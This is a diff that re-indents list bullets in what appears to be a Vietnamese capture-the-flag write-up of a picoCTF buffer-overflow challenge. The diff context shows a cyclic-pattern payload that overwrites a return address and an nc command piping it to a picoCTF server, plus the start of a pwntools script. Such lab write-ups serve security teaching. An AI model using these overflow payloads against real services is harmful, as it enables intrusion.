@@ -79,9 +79,9 @@ b) Bước 2: Viết payload
 c) Bước 3: Truyền payload
 
 - Cách 1: truyền bằng pipe:
-+ Payload:
+  + Payload:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3\x3b\x12\x40
-+ Câu lệnh truyền payload bằng pipe:
+  + Câu lệnh truyền payload bằng pipe:
 
 ```cpp
 (echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3\x3b\x12\x40"; cat) | nc saturn.picoctf.net 56006
@@ -90,7 +90,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3\x3b\x12
 ![image.png](image%204.png)
 
 - Cách 2: dùng file thực thi
-+ Ta tạo file python thực thi:
+  + Ta tạo file python thực thi:
 
 ```cpp
 from pwn import *
